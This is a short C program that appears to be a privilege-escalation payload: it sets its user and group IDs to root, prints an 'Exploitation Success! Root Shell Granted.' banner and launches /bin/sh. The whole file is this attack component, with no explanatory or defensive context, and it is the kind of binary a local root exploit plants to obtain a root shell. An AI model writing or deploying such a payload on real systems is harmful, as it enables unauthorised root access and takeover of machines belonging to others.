#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    printf("[+] Exploitation Success! Root Shell Granted.\n");
    system("/bin/sh");
    return 0;
}
